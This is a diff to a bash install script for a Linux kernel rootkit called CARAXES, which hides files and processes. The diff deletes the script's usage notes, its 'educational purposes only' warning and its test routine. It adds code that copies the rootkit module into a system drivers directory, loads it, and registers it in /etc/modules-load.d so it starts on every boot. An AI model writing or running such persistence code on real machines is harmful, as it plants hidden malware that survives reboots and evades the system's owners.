@@ -177,135 +177,96 @@ compile_rootkit() {
     fi
 }
 
-# Function to show usage instructions
-show_usage() {
-    print_success "Installation complete!"
-    echo
-    echo -e "${BLUE}Usage Instructions:${NC}"
-    echo "1. Configure the rootkit by editing rootkit.h:"
-    echo "   - MAGIC_WORD: Files/processes containing this string will be hidden"
-    echo "   - USER_HIDE: Hide processes owned by this user ID"
-    echo "   - GROUP_HIDE: Hide processes owned by this group ID"
-    echo "   - HIDE_PROCESS_EXE: Hide processes with this executable path"
-    echo "   - HIDE_PROCESS_CMDLINE: Hide processes with this command line"
-    echo
-    echo "2. Load the rootkit:"
-    echo "   sudo insmod caraxes.ko"
-    echo
-    echo "3. Test the hiding functionality:"
-    echo "   ls  # Files with 'caraxes' in name should be hidden"
-    echo "   ps aux | grep <target_process>"
-    echo
-    echo "4. Unload the rootkit:"
-    echo "   sudo rmmod caraxes"
-    echo
-    echo -e "${YELLOW}Warning:${NC} This is for educational purposes only!"
-    echo "Use responsibly and only on systems you own or have permission to test."
-    echo
-    echo "See PROCESS_HIDING_GUIDE.md for detailed usage instructions."
-}
-
-# Function to create a simple test script
-create_test_script() {
-    print_status "Creating test script..."
+# Function to install module to system location
+install_module_system() {
+    print_status "Installing module to system location..."
     
-    cat > test_rootkit.sh << 'EOF'
-#!/bin/bash
-
-# Simple test script for CARAXES rootkit
-
-echo "=== CARAXES Rootkit Test Script ==="
-echo
-
-# Check if rootkit module exists
-if [ ! -f "caraxes.ko" ]; then
-    echo "ERROR: caraxes.ko not found. Run ./install.sh first."
-    exit 1
-fi
-
-echo "1. Current files in directory (before loading rootkit):"
-ls -la | grep caraxes || echo "No caraxes files visible"
-echo
-
-echo "2. Loading rootkit..."
-if sudo insmod caraxes.ko; then
-    echo "Rootkit loaded successfully"
-else
-    echo "Failed to load rootkit"
-    exit 1
-fi
-
-echo
-
-echo "3. Files after loading rootkit (caraxes files should be hidden):"
-ls -la | grep caraxes || echo "No caraxes files visible (this is expected)"
-echo
-
-echo "4. Checking loaded modules:"
-lsmod | grep caraxes || echo "Module not visible in lsmod (may be hidden)"
-echo
-
-read -p "Press Enter to unload the rootkit..."
-
-echo "5. Unloading rootkit..."
-if sudo rmmod caraxes; then
-    echo "Rootkit unloaded successfully"
-else
-    echo "Failed to unload rootkit"
-fi
-
-echo
-
-echo "6. Files after unloading rootkit:"
-ls -la | grep caraxes
-echo
-
-echo "Test complete!"
-EOF
-
-    chmod +x test_rootkit.sh
-    print_success "Test script created: test_rootkit.sh"
-}
-
-# Main installation process
-main() {
-    echo -e "${BLUE}"
-    echo "========================================"
-    echo "  CARAXES Rootkit Installation Script"
-    echo "========================================"
-    echo -e "${NC}"
+    CURRENT_DIR=$(pwd)
     
-    # Check if we're in the right directory
-    if [ ! -f "caraxes.c" ] || [ ! -f "Makefile" ]; then
-        print_error "Please run this script from the CARAXES rootkit directory"
-        print_error "Required files: caraxes.c, Makefile"
+    # Create directory structure and install module
+    if sudo mkdir -p /lib/modules/$(uname -r)/kernel/drivers/caraxes; then
+        print_success "Created module directory"
+    else
+        print_error "Failed to create module directory"
         exit 1
     fi
-    
-    # Detect distribution
-    detect_distro
-    
-    # Install dependencies
-    install_dependencies
-    
-    # Check kernel headers
-    check_kernel_headers
-    
-    # Check root privileges
-    check_root_for_module
-    
-    # Clean previous builds
-    clean_build
-    
-    # Compile the rootkit
-    compile_rootkit
-    
-    # Create test script
-    create_test_script
-    
-    # Show usage instructions
-    show_usage
+
+    # Copy module to system location
+    if sudo cp "$CURRENT_DIR/caraxes.ko" /lib/modules/$(uname -r)/kernel/drivers/caraxes/; then
+        print_success "Module copied to system directory"
+    else
+        print_error "Failed to copy module"
+        exit 1
+    fi
+
+    # Check if module is already loaded and remove it
+    if lsmod | grep -q caraxes; then
+        print_warning "Module already loaded, removing it first..."
+        sudo rmmod caraxes || true
+    fi
+
+    # Load the module
+    if sudo insmod /lib/modules/$(uname -r)/kernel/drivers/caraxes/caraxes.ko; then
+        print_success "Module loaded successfully"
+    else
+        print_error "Failed to load module"
+        print_warning "Try manually removing conflicting modules with: sudo rmmod <module_name>"
+        exit 1
+    fi
+
+    # Update module dependencies
+    print_status "Updating module dependencies..."
+    sudo depmod -a
+
+    # Add to auto-load configuration
+    print_status "Configuring auto-load..."
+    echo "caraxes" | sudo tee /etc/modules-load.d/caraxes.conf > /dev/null
+
+    # Load with modprobe
+    if sudo modprobe caraxes; then
+        print_success "Module configured for auto-load"
+    else
+        print_warning "Module already loaded"
+    fi
+
+    echo
+    print_success "Installation completed successfully!"
+
+    # Verify module is loaded
+    print_status "Verifying module is loaded..."
+    if lsmod | grep -q caraxes; then
+        print_success "Module is now active and will auto-load on boot"
+    else
+        print_warning "Warning: Module may not be loaded properly"
+    fi
 }
 
-# Run main function
-main "$@"
+
+
+# Check if we're in the right directory
+if [ ! -f "caraxes.c" ] || [ ! -f "Makefile" ]; then
+    print_error "Please run this script from the CARAXES rootkit directory"
+    print_error "Required files: caraxes.c, Makefile"
+    exit 1
+fi
+
+# Detect distribution
+detect_distro
+
+# Install dependencies
+install_dependencies
+
+# Check kernel headers
+check_kernel_headers
+
+# Check root privileges
+check_root_for_module
+
+# Clean previous builds
+clean_build
+
+# Compile the rootkit
+compile_rootkit
+
+# Install module to system location
+install_module_system
